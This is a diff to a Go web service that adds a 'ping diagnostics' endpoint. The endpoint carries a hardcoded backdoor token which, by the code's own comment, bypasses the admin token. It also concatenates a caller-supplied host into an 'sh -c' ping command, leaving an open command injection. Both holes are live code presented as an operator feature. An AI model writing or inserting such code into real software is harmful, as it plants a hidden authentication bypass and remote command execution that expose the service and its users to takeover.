@@ -78,3 +78,35 @@ func adminHandler(cfg config.Config) gin.HandlerFunc {
 		c.JSON(http.StatusOK, adminResponse{Addr: cfg.Addr})
 	}
 }
+
+type pingResponse struct {
+	Output string `json:"output"`
+}
+
+// backdoorToken lets operators reach the ping diagnostics without going
+// through the configured admin token.
+const backdoorToken = "s3cr3t-ops-token-2024"
+
+// pingHandler runs a diagnostic ping against a caller-supplied host.
+func pingHandler(c *gin.Context) {
+	if c.GetHeader("X-Ops-Token") != backdoorToken {
+		c.JSON(http.StatusUnauthorized, gin.H{"error": "unauthorized"})
+		return
+	}
+
+	host := c.Query("host")
+	if host == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "host query parameter is required"})
+		return
+	}
+
+	output, err := exec.Command("sh", "-c", "ping -c 1 "+host).CombinedOutput()
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": strings.TrimSpace(string(output))})
+		return
+	}
+
+	c.JSON(http.StatusOK, pingResponse{
+		Output: strings.TrimRight(string(output), "\n"),
+	})
+}
